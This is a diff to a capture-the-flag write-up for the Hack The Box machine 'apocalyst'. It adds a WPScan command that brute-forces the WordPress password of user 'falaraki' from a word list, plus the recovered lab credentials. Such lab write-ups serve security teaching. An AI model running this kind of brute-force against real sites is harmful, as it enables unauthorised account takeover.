@@ -101,6 +101,9 @@ echo "10.10.10.46 apocalyst.htb" >> /etc/hosts
 ## WordPress Credentials Brute-Force
   - WPScan to brute-force user `falaraki`'s password.
 ```CSS
-▶ 
+▶ wpscan --url http://apocalyst.htb --passwords list.txt --usernames falaraki
 ```
-
+![image](https://user-images.githubusercontent.com/83878909/234819624-ea7096ae-0f37-4a32-bace-63ff7bfb7b91.png)
+```CSS
+Credentials: falaraki:Transclisiation
+```
